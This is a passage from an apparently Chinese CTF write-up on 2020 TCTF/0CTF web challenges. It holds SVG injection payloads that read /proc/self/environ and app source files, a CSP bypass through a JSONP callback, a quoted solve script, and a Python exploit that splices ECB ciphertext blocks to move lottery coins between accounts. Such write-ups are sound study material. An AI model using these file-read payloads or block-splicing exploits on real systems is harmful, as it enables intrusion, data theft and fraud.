<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data&#x3D;[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;[smile\&quot;&#x2F;&gt; &lt;image xlink:href&#x3D;\&quot;text:&#x2F;proc&#x2F;self&#x2F;environ\&quot; x&#x3D;\&quot;0\&quot; y&#x3D;\&quot;0\&quot; height&#x3D;\&quot;640px\&quot; width&#x3D;\&quot;480px\&quot;&#x2F;&gt;]Love you!&quot;&#125;]</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200702234657290.png" alt="image-20200702234657290"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data&#x3D;[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;[smile\&quot;&#x2F;&gt; &lt;image xlink:href&#x3D;\&quot;text:&#x2F;prprococ&#x2F;self&#x2F;enenvviron\&quot; x&#x3D;\&quot;0\&quot; y&#x3D;\&quot;0\&quot; height&#x3D;\&quot;640px\&quot; width&#x3D;\&quot;480px\&quot;&#x2F;&gt;]Love you!&quot;&#125;]</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200702234859538.png" alt="image-20200702234859538"></p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200702235047336.png" alt="image-20200702235047336"></p>
<p>继续读/proc/self/maps</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data&#x3D;[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;[smile\&quot;&#x2F;&gt; &lt;image xlink:href&#x3D;\&quot;text:&#x2F;prprococ&#x2F;self&#x2F;maps\&quot; x&#x3D;\&quot;0\&quot; y&#x3D;\&quot;0\&quot; height&#x3D;\&quot;640px\&quot; width&#x3D;\&quot;480px\&quot;&#x2F;&gt;]Love you!&quot;&#125;]</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200702235153918.png" alt="image-20200702235153918"></p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200702235414315.png" alt="image-20200702235414315"></p>
<p>之后读/app/app.py</p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200702235556740.png" alt="image-20200702235556740"></p>
<p>看到/SUp3r_S3cret_URL/0Nly_4dM1n_Kn0ws路由，需要alert(1)才可以读到flag，有CSP如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: img-src * data:; default-src &#39;self&#39;; style-src &#39;self&#39; &#39;unsafe-inline&#39;; connect-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;self&#39;</span><br></pre></td></tr></table></figure>

<p>利用meta refresh进行跳转，在服务器上放</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;Love you!&quot;&#125;,&#123;&quot;type&quot;:1,&quot;message&quot;:&quot;[pout\&quot;&#x2F;&gt;&lt;memetata http-equiv&#x3D;\&quot;refresh\&quot; content&#x3D;\&quot;0; url&#x3D;http:&#x2F;&#x2F;*******&#x2F;0ctf&#x2F;\&quot;&gt;&lt;&#x2F;memetata&gt;\&quot;]Me too!!!&quot;&#125;]</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200703235118990.png" alt="image-20200703235118990"></p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200704000825506.png" alt="image-20200704000825506"></p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200703234318318.png" alt="image-20200703234318318"></p>
<p>还有另一种做法，绕过CSP，因为要同源，所以要找到<a href="http://pwnable.org:5000同源的里面包含alert(1)，@hyperreality师傅在http://pwnable.org:5000/image/DFBkps/png?callback找到了callback参数，而且可以添加引号闭合，构造出alert(1)。" target="_blank" rel="noopener">http://pwnable.org:5000同源的里面包含alert(1)，@hyperreality师傅在http://pwnable.org:5000/image/DFBkps/png?callback找到了callback参数，而且可以添加引号闭合，构造出alert(1)。</a></p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707165651426.png" alt="image-20200707165651426"></p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707165745653.png" alt="image-20200707165745653"></p>
<p>将这个链接添加到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;Love you!&quot;&#125;,&#123;&quot;type&quot;:1,&quot;message&quot;:&quot;[lmfao.png\&quot;&#x2F;&gt; &lt;script xlink:href&#x3D;\&quot;http:&#x2F;&#x2F;pwnable.org:5000&#x2F;image&#x2F;xzEHbO&#x2F;png?callback&#x3D;d&#x3D;&#39;\&quot; &#x2F;&gt; ] &quot;&#125;]</span><br></pre></td></tr></table></figure>

<p>然后得到share的图片链接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;url&quot;: &quot;http:&#x2F;&#x2F;pwnable.org:5000&#x2F;share&#x2F;eDlIfk&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>访问<a href="http://pwnable.org:5000/image/eDlIfk/svg" target="_blank" rel="noopener">http://pwnable.org:5000/image/eDlIfk/svg</a></p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707165905869.png" alt="image-20200707165905869"></p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">import json</span><br><span class="line">&gt;import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def preview(svg_data):</span><br><span class="line"> data &#x3D; &#123;</span><br><span class="line">   &#39;data&#39;: svg_data</span><br><span class="line"> &#125;</span><br><span class="line"> response &#x3D; requests.post(&#39;http:&#x2F;&#x2F;pwnable.org:5000&#x2F;preview&#39;, data&#x3D;data)</span><br><span class="line"> print(response.text[:100])</span><br><span class="line"> resp &#x3D; json.loads(response.text)</span><br><span class="line">   </span><br><span class="line">    previewid &#x3D; resp[&quot;previewid&quot;]</span><br><span class="line">    data &#x3D; resp[&quot;data&quot;]</span><br><span class="line">   </span><br><span class="line">    return resp[&quot;previewid&quot;], resp[&quot;data&quot;]</span><br><span class="line">   </span><br><span class="line">def share(previewid):</span><br><span class="line">    data &#x3D; &#123;</span><br><span class="line">      &#39;previewid&#39;: previewid</span><br><span class="line"> &#125;</span><br><span class="line">    response &#x3D; requests.post(&#39;http:&#x2F;&#x2F;pwnable.org:5000&#x2F;share&#39;, data&#x3D;data)</span><br><span class="line"> print(response.text[:100])</span><br><span class="line"> resp &#x3D; json.loads(response.text)</span><br><span class="line">   </span><br><span class="line">    return resp[&quot;url&quot;]</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   ### Stage 1: read files</span><br><span class="line">   </span><br><span class="line"># URL &#x3D; &quot;http:&#x2F;&#x2F;r0p.me&#x2F;bla.svg&quot;</span><br><span class="line">   # URL &#x3D; &quot;text:&#x2F;etc&#x2F;os-release&quot;</span><br><span class="line"># URL &#x3D; &quot;text:&#x2F;proc&#x2F;self&#x2F;environ&quot;</span><br><span class="line"># URL &#x3D; &quot;text:&#x2F;flag&quot;</span><br><span class="line"># URL &#x3D; &quot;text:&#x2F;usr&#x2F;share&#x2F;ghostscript&#x2F;9.27&#x2F;Resource&#x2F;Init&#x2F;gs_ll3.ps&quot;</span><br><span class="line"># URL &#x3D; &quot;text:&#x2F;etc&#x2F;ImageMagick-6&#x2F;policy.xml&quot;</span><br><span class="line">URL &#x3D; &quot;text:&#x2F;app&#x2F;app.py&quot;</span><br><span class="line">svg_data &#x3D; &#39;[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;Love you!&quot;&#125;,&#123;&quot;type&quot;:1,&quot;message&quot;:&quot;[lmfao.png\\&quot;&#x2F;&gt; &lt;image height&#x3D;\\&quot;1600\\&quot; width&#x3D;\\&quot;1000\\&quot; xlink:href&#x3D;\\&quot;&#39; + URL + &#39;\\&quot; &#x2F;&gt; ] &quot;&#125;]&#39;</span><br><span class="line">previewid, data &#x3D; preview(svg_data)</span><br><span class="line"></span><br><span class="line">svg_decoded &#x3D; base64.b64decode(data.split(&#39;,&#39;)[1])</span><br><span class="line"># print(svg_decoded)</span><br><span class="line"></span><br><span class="line">url &#x3D; share(previewid)</span><br><span class="line">png_link &#x3D; f&quot;&#123;url.replace(&#39;share&#39;, &#39;image&#39;)&#125;&#x2F;png&quot;</span><br><span class="line">svg_link &#x3D; f&quot;&#123;url.replace(&#39;share&#39;, &#39;image&#39;)&#125;&#x2F;svg&quot;</span><br><span class="line">print(png_link)</span><br><span class="line">print(svg_link)</span><br><span class="line"># visit_png &#x3D; requests.get(png_link) # Trigger the HTTP request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### Stage 2: get the flag</span><br><span class="line"></span><br><span class="line">def admin(link):</span><br><span class="line"> data &#x3D; &#123;</span><br><span class="line">   &#39;url&#39;: link</span><br><span class="line"> &#125;</span><br><span class="line"> response &#x3D; requests.post(&#39;http:&#x2F;&#x2F;pwnable.org:5000&#x2F;SUp3r_S3cret_URL&#x2F;0Nly_4dM1n_Kn0ws&#39;, data&#x3D;data)</span><br><span class="line"> print(response.text)</span><br><span class="line"></span><br><span class="line">   injected_previewid &#x3D; &quot;&quot;&quot;&#39; + alert(1); b &#x3D; &#123;&#39;c&#39;: &quot; &quot;&quot;&quot;</span><br><span class="line">   url &#x3D; share(injected_previewid)</span><br><span class="line">   png_link &#x3D; f&quot;&#123;url.replace(&#39;share&#39;, &#39;image&#39;)&#125;&#x2F;png&quot; # This URL returns an error which we can manipulate with callback</span><br><span class="line">   </span><br><span class="line">   malicious_link &#x3D; f&quot;&#123;png_link&#125;?callback&#x3D;a&#x3D;&#39;&quot;</span><br><span class="line"></span><br><span class="line">svg_data &#x3D; &#39;[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;Love you!&quot;&#125;,&#123;&quot;type&quot;:1,&quot;message&quot;:&quot;[lmfao.png\\&quot;&#x2F;&gt; &lt;script xlink:href&#x3D;\\&quot;&#39; + malicious_link + &#39;\\&quot; &#x2F;&gt; ] &quot;&#125;]&#39;</span><br><span class="line">previewid, data &#x3D; preview(svg_data)</span><br><span class="line">url &#x3D; share(previewid)</span><br><span class="line">svg_link &#x3D; f&quot;&#123;url.replace(&#39;share&#39;, &#39;image&#39;)&#125;&#x2F;svg&quot;</span><br><span class="line"></span><br><span class="line">path_only &#x3D; svg_link.replace(&#39;http:&#x2F;&#x2F;pwnable.org:5000&#39;, &#39;&#39;)</span><br><span class="line"></span><br><span class="line">admin(path_only)</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/hyperreality/ctf-writeups/blob/master/2020_tctf/wechat_solve.py" target="_blank" rel="noopener">https://github.com/hyperreality/ctf-writeups/blob/master/2020_tctf/wechat_solve.py</a></p>
</blockquote>
<h1 id="0x03-lottery"><a href="#0x03-lottery" class="headerlink" title="0x03 lottery"></a>0x03 lottery</h1><p><a href="http://pwnable.org:2333/index.html" target="_blank" rel="noopener">http://pwnable.org:2333/index.html</a></p>
<p>有如下几个路由：</p>
<p>uer/register 注册</p>
<p>user/login 登录</p>
<p>lottery/buy  用钱买彩票，可以得到enc</p>
<p>lottery/info  得到enc解密消息,包括userid  lotteryid  coin</p>
<p>lottery/charge 兑换</p>
<p>修改coin和userid都不可以，那么就是要分析密文了。找几组enc，base64解密后变成十六进制。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">enc1 &#x3D; &quot;uO3FId8cC%2FcMSJWDrHEIrWAiUTho2AhhKiG8qMm97OFT7u7T1iP3G69pp6bKzzskQdhwNiABgT0Z7DMcD6Ak4gw7PbdNt%2BNkc1TVOlnCf3buJDg1LVhP%2B6b8pAXj6WRmfZKdxFMoBME3TgxrN8viG%2FbSt9reYD8AcCI4hIXsxZg%3D&quot;</span><br><span class="line">enc2 &#x3D; &quot;V3evI3E%2FuuiKZWrHEZ3oqoMNZp9ANL4LMFX2VtEfxIwBI8hEQRsYMDIA68eFNVSFaHSV4HX%2F1rpZXB%2BS1ml48Aw7PbdNt%2BNkc1TVOlnCf3buJDg1LVhP%2B6b8pAXj6WRmS9523eKWmeG4xnF%2F1YrQQ%2FbSt9reYD8AcCI4hIXsxZg%3D&quot;</span><br><span class="line">enc3 &#x3D; &quot;JoWNsPteqpYQPCeb4qyZmKW9YY7N4nmipnLhp5VnnKkYDhRSv4mKCV3MQ4AKjQlcBw%2F%2BpM3dZ9ZZDCFz4XXvEww7PbdNt%2BNkc1TVOlnCf3buJDg1LVhP%2B6b8pAXj6WRmseX2ZnXgak2Q9%2BrPTFTzTPbSt9reYD8AcCI4hIXsxZg%3D&quot;</span><br><span class="line">enc4 &#x3D; &quot;wHHv0RlzbcX5hjFrmcB4EnX9PDT13HUC6kRcQeOh2toHnCAvyI%2BNfi78JwhQA%2F%2F7CIG%2BiTlAsgxiPGeXkTVGAgw7PbdNt%2BNkc1TVOlnCf3buJDg1LVhP%2B6b8pAXj6WRmS9523eKWmeG4xnF%2F1YrQQ%2FbSt9reYD8AcCI4hIXsxZg%3D&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b8edc521df1c0bf70c489583ac7108ad6022513868d808612a21bca8c9bdece153eeeed3d623f71baf69a7a6cacf3b2441d870362001813d19ec331c0fa024e20c3b3db74db7e3647354d53a59c27f76ee2438352d584ffba6fca405e3e964667d929dc4532804c1374e0c6b37cbe21bf6d2b7dade603f007022388485ecc598</span><br><span class="line">b8edc521df1c0bf70c489583ac7108ad</span><br><span class="line">6022513868d808612a21bca8c9bdece1</span><br><span class="line">53eeeed3d623f71baf69a7a6cacf3b24</span><br><span class="line">41d870362001813d19ec331c0fa024e2</span><br><span class="line">0c3b3db74db7e3647354d53a59c27f76</span><br><span class="line">ee2438352d584ffba6fca405e3e96466</span><br><span class="line">7d929dc4532804c1374e0c6b37cbe21b</span><br><span class="line">f6d2b7dade603f007022388485ecc598</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">5777af23713fbae88a656ac7119de8aa830d669f4034be0b3055f656d11fc48c0123c844411b18303200ebc785355485687495e075ffd6ba595c1f92d66978f00c3b3db74db7e3647354d53a59c27f76ee2438352d584ffba6fca405e3e964664bde76dde29699e1b8c6717fd58ad043f6d2b7dade603f007022388485ecc598</span><br><span class="line">5777af23713fbae88a656ac7119de8aa</span><br><span class="line">830d669f4034be0b3055f656d11fc48c</span><br><span class="line">0123c844411b18303200ebc785355485</span><br><span class="line">687495e075ffd6ba595c1f92d66978f0</span><br><span class="line">0c3b3db74db7e3647354d53a59c27f76</span><br><span class="line">ee2438352d584ffba6fca405e3e96466</span><br><span class="line">4bde76dde29699e1b8c6717fd58ad043</span><br><span class="line">f6d2b7dade603f007022388485ecc598</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">26858db0fb5eaa96103c279be2ac9998a5bd618ecde279a2a672e1a795679ca9180e1452bf898a095dcc43800a8d095c070ffea4cddd67d6590c2173e175ef130c3b3db74db7e3647354d53a59c27f76ee2438352d584ffba6fca405e3e96466b1e5f66675e06a4d90f7eacf4c54f34cf6d2b7dade603f007022388485ecc598</span><br><span class="line">26858db0fb5eaa96103c279be2ac9998</span><br><span class="line">a5bd618ecde279a2a672e1a795679ca9</span><br><span class="line">180e1452bf898a095dcc43800a8d095c</span><br><span class="line">070ffea4cddd67d6590c2173e175ef13</span><br><span class="line">0c3b3db74db7e3647354d53a59c27f76</span><br><span class="line">ee2438352d584ffba6fca405e3e96466</span><br><span class="line">b1e5f66675e06a4d90f7eacf4c54f34c</span><br><span class="line">f6d2b7dade603f007022388485ecc598</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c071efd119736dc5f986316b99c0781275fd3c34f5dc7502ea445c41e3a1dada079c202fc88f8d7e2efc27085003fffb0881be893940b20c623c6797913546020c3b3db74db7e3647354d53a59c27f76ee2438352d584ffba6fca405e3e964664bde76dde29699e1b8c6717fd58ad043f6d2b7dade603f007022388485ecc598</span><br><span class="line">c071efd119736dc5f986316b99c07812</span><br><span class="line">75fd3c34f5dc7502ea445c41e3a1dada</span><br><span class="line">079c202fc88f8d7e2efc27085003fffb</span><br><span class="line">0881be893940b20c623c679791354602</span><br><span class="line">0c3b3db74db7e3647354d53a59c27f76</span><br><span class="line">ee2438352d584ffba6fca405e3e96466</span><br><span class="line">4bde76dde29699e1b8c6717fd58ad043</span><br><span class="line">f6d2b7dade603f007022388485ecc598</span><br><span class="line"></span><br><span class="line">可以看出是分组密码，采用的是ECB模式</span><br><span class="line">每组有16字节，128位</span><br><span class="line">密文共有8组，128字节</span><br></pre></td></tr></table></figure>

<p>因为有/info可以解密，所以可以测试分组的规律。</p>
<p>用两个user、coin相同的，lottery不同来判断lottery的位置。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n634F%2Fu7aGYxw8sv3N34F7xISHbfGeHavxo82CFF6GIKsCqbsT1QJTR8X6ehi68XFnee8i%2B8x8bwoSsy2ZJnzx6n0wnptbiUy%2B729fczcNavFwXL3xBqQk9DnZWPX8q%2BeZ%2FMfLiNQVm%2FdAlU93aBTfbSt9reYD8AcCI4hIXsxZg%3D</span><br><span class="line">&#123;&quot;info&quot;:&#123;&quot;lottery&quot;:&quot;6a564b59-1a3b-4ecc-aaa1-3bd1b2cfe7b3&quot;,&quot;user&quot;:&quot;8e60dd01-be04-4932-a1c6-7eb70d57423a&quot;,&quot;coin&quot;:6&#125;&#125;</span><br><span class="line"></span><br><span class="line">xSjWMxj9VTzGLTnYR00pWHlHT2e8CKzrh%2FQg%2BWyPIBrS6pwgQBUKDEmb1toU1j08LWID2CcmlHmD3tPtP4H2dh6n0wnptbiUy%2B729fczcNavFwXL3xBqQk9DnZWPX8q%2BeZ%2FMfLiNQVm%2FdAlU93aBTfbSt9reYD8AcCI4hIXsxZg%3D</span><br><span class="line">&#123;&quot;info&quot;:&#123;&quot;lottery&quot;:&quot;fd79618b-2579-4c60-ad38-a9efea2be4ed&quot;,&quot;user&quot;:&quot;8e60dd01-be04-4932-a1c6-7eb70d57423a&quot;,&quot;coin&quot;:6&#125;&#125;</span><br><span class="line"></span><br><span class="line">9fadf817fbbb686631c3cb2fdcddf817bc484876df19e1dabf1a3cd82145e8620ab02a9bb13d5025347c5fa7a18baf1716779ef22fbcc7c6f0a12b32d99267cf1ea7d309e9b5b894cbeef6f5f73370d6af1705cbdf106a424f439d958f5fcabe799fcc7cb88d4159bf740954f776814df6d2b7dade603f007022388485ecc598</span><br><span class="line">9fadf817fbbb686631c3cb2fdcddf817</span><br><span class="line">bc484876df19e1dabf1a3cd82145e862</span><br><span class="line">0ab02a9bb13d5025347c5fa7a18baf17</span><br><span class="line">16779ef22fbcc7c6f0a12b32d99267cf</span><br><span class="line">1ea7d309e9b5b894cbeef6f5f73370d6</span><br><span class="line">af1705cbdf106a424f439d958f5fcabe</span><br><span class="line">799fcc7cb88d4159bf740954f776814d</span><br><span class="line">f6d2b7dade603f007022388485ecc598</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c528d63318fd553cc62d39d8474d295879474f67bc08aceb87f420f96c8f201ad2ea9c2040150a0c499bd6da14d63d3c2d6203d82726947983ded3ed3f81f6761ea7d309e9b5b894cbeef6f5f73370d6af1705cbdf106a424f439d958f5fcabe799fcc7cb88d4159bf740954f776814df6d2b7dade603f007022388485ecc598</span><br><span class="line">c528d63318fd553cc62d39d8474d2958</span><br><span class="line">79474f67bc08aceb87f420f96c8f201a</span><br><span class="line">d2ea9c2040150a0c499bd6da14d63d3c</span><br><span class="line">2d6203d82726947983ded3ed3f81f676</span><br><span class="line">1ea7d309e9b5b894cbeef6f5f73370d6</span><br><span class="line">af1705cbdf106a424f439d958f5fcabe</span><br><span class="line">799fcc7cb88d4159bf740954f776814d</span><br><span class="line">f6d2b7dade603f007022388485ecc598</span><br></pre></td></tr></table></figure>

<p>后四组相同，说明第四组中含有lottery，可能含有user的userid（无法找到只有userid不同的两个enc）,可以用找两个userid不同的enc，base解密后，第一个的前四组和第二个的后四组拼接在一起发送，看是否成功。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode,b64encode</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">enc1 = <span class="string">"n634F%2Fu7aGYxw8sv3N34F7xISHbfGeHavxo82CFF6GIKsCqbsT1QJTR8X6ehi68XFnee8i%2B8x8bwoSsy2ZJnzx6n0wnptbiUy%2B729fczcNavFwXL3xBqQk9DnZWPX8q%2BeZ%2FMfLiNQVm%2FdAlU93aBTfbSt9reYD8AcCI4hIXsxZg%3D"</span></span><br><span class="line"><span class="comment">#&#123;"info":&#123;"lottery":"6a564b59-1a3b-4ecc-aaa1-3bd1b2cfe7b3","user":"8e60dd01-be04-4932-a1c6-7eb70d57423a","coin":6&#125;&#125;</span></span><br><span class="line">enc2 = <span class="string">"wHHv0RlzbcX5hjFrmcB4EnX9PDT13HUC6kRcQeOh2toHnCAvyI%2BNfi78JwhQA%2F%2F7CIG%2BiTlAsgxiPGeXkTVGAgw7PbdNt%2BNkc1TVOlnCf3buJDg1LVhP%2B6b8pAXj6WRmS9523eKWmeG4xnF%2F1YrQQ%2FbSt9reYD8AcCI4hIXsxZg%3D"</span></span><br><span class="line"><span class="comment">#&#123;"info":&#123;"lottery":"f838f210-9932-4d6a-98ae-9d22758c2554","user":"263020e2-8add-4c0c-a5dc-4659556890e5","coin":2&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ci1 = b64decode(unquote(enc1))</span><br><span class="line"><span class="keyword">print</span> ci1+<span class="string">"\n"</span></span><br><span class="line">ci2 = b64decode(unquote(enc2))</span><br><span class="line"><span class="keyword">print</span> ci2+<span class="string">"\n"</span></span><br><span class="line">ci3 = ci1[:<span class="number">64</span>]+ci2[<span class="number">64</span>:]</span><br><span class="line"><span class="keyword">print</span> ci1[:<span class="number">64</span>]</span><br><span class="line"><span class="keyword">print</span> ci2[<span class="number">64</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> b64encode(ci3)</span><br><span class="line">data = &#123;<span class="string">"enc"</span>:b64encode(ci3)&#125;</span><br><span class="line"><span class="keyword">print</span> requests.post(<span class="string">"http://pwnable.org:2333/lottery/info"</span>,data=data).text</span><br><span class="line"><span class="comment">#&#123;"info":&#123;"lottery":"6a564b59-1a3b-4ecc-aaa1-3bd1b2cfe7b3","user":"8e3020e2-8add-4c0c-a5dc-4659556890e5","coin":2&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>从上面可以看出解密得到的结果</p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707085633140.png" alt="image-20200707085633140"></p>
<p>加密时分组的第四组包括userid的前两位，所以只要注册几个userid的前两位相同的用户，然后将买到彩票得到的enc后四组全部替换到一个user,就可以把钱都转移到一个user中。</p>
<ol>
<li><p>注册得到一个uuid开头是76的用户，保存他买彩票得到的enc。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;enc&quot;:&quot;Ht3U37\&#x2F;f5B2DfJue3XduaO9fK591DAP7mCPmZu13mZKmem+107YSQA07GKGGrezJlzhJ3cBJCvdxwpLj4N3dz\&#x2F;VxMdT9mIEQ2hBe+qQKHtagwQ3B2ZAN9gvW2j57Xpqp8zuNPhJ\&#x2F;H0kmQaeAAqobYPhIZnVHgXwIkkuehhS\&#x2F;11g&#x3D;&quot;&#125;</span><br><span class="line">&#123;&quot;info&quot;:&#123;&quot;lottery&quot;:&quot;7443b465-8661-4770-8942-d7d4fc5ec47c&quot;,&quot;user&quot;:&quot;7638b0fb-7651-4c68-a02e-dc1753a2eb10&quot;,&quot;coin&quot;:10&#125;&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>继续注册寻找uuid开头为76的用户，找到就买彩票（可以买三次），将得到的enc base64解密后前四组，加上前面得到用户enc base64解密的后四组，去charge。</p>
</li>
<li><p>之后买flag</p>
</li>
</ol>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode,b64encode</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">"http://pwnable.org:2333/"</span></span><br><span class="line">proxy = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(username)</span>:</span></span><br><span class="line">	data = &#123;<span class="string">"username"</span>:username,<span class="string">"password"</span>:<span class="string">"abcdefg"</span>&#125;</span><br><span class="line">	re = requests.post(url+<span class="string">"user/register"</span>,data = data,proxies=proxy)</span><br><span class="line">	<span class="keyword">return</span> json.loads(re.text)[<span class="string">"user"</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username,password=<span class="string">"abcdefg"</span>)</span>:</span></span><br><span class="line">	data = &#123;<span class="string">"username"</span>:username,<span class="string">"password"</span>:password&#125;</span><br><span class="line">	re = requests.post(url+<span class="string">"user/login"</span>,data = data,proxies=proxy)</span><br><span class="line">	<span class="keyword">return</span> json.loads(re.text)[<span class="string">"user"</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy</span><span class="params">(apitoken)</span>:</span></span><br><span class="line">	data = &#123;<span class="string">"api_token"</span>:apitoken&#125;</span><br><span class="line">	cookie = &#123;<span class="string">"api_token"</span>:apitoken&#125;</span><br><span class="line">	re = requests.post(url+<span class="string">"lottery/buy"</span>,data = data,cookies=cookie,proxies=proxy)</span><br><span class="line">	<span class="keyword">return</span> json.loads(re.text)[<span class="string">"enc"</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">charge</span><span class="params">(enc,apitoken)</span>:</span></span><br><span class="line">	data = &#123;<span class="string">"user"</span>:<span class="string">"7638b0fb-7651-4c68-a02e-dc1753a2eb10"</span>,<span class="string">"coin"</span>:<span class="string">"10"</span>,<span class="string">"enc"</span>:enc&#125;</span><br><span class="line">	cookie = &#123;<span class="string">"api_token"</span>:apitoken&#125;</span><br><span class="line">	re = requests.post(url+<span class="string">"lottery/charge"</span>,data = data,cookies = cookie,proxies=proxy)</span><br><span class="line">	<span class="keyword">return</span> re.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enc1 = <span class="string">"Ht3U37%2Ff5B2DfJue3XduaO9fK591DAP7mCPmZu13mZKmem%2B107YSQA07GKGGrezJlzhJ3cBJCvdxwpLj4N3dz%2FVxMdT9mIEQ2hBe%2BqQKHtagwQ3B2ZAN9gvW2j57Xpqp8zuNPhJ%2FH0kmQaeAAqobYPhIZnVHgXwIkkuehhS%2F11g%3D"</span></span><br><span class="line">ci1 = b64decode(unquote(enc1))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">	username = <span class="string">''</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">10</span>))</span><br><span class="line">	user = register(username)</span><br><span class="line">	<span class="keyword">print</span> user[<span class="string">"uuid"</span>]</span><br><span class="line">	tmp = <span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span>(user[<span class="string">"uuid"</span>][:<span class="number">2</span>] == <span class="string">"76"</span>):</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">			user = login(username)</span><br><span class="line">			enc = buy(user[<span class="string">"api_token"</span>])</span><br><span class="line">			ci2 = b64decode(unquote(enc))</span><br><span class="line">			ci3 = ci2[:<span class="number">64</span>]+ci1[<span class="number">64</span>:]</span><br><span class="line">			data = &#123;<span class="string">"enc"</span>:b64encode(ci3)&#125;</span><br><span class="line">			<span class="keyword">print</span> requests.post(<span class="string">"http://pwnable.org:2333/lottery/info"</span>,data=data,proxies=proxy).text</span><br><span class="line">			<span class="keyword">print</span> charge(b64encode(ci3),user[<span class="string">"api_token"</span>])</span><br><span class="line">			tmp +=<span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span> tmp &gt; <span class="number">6</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>

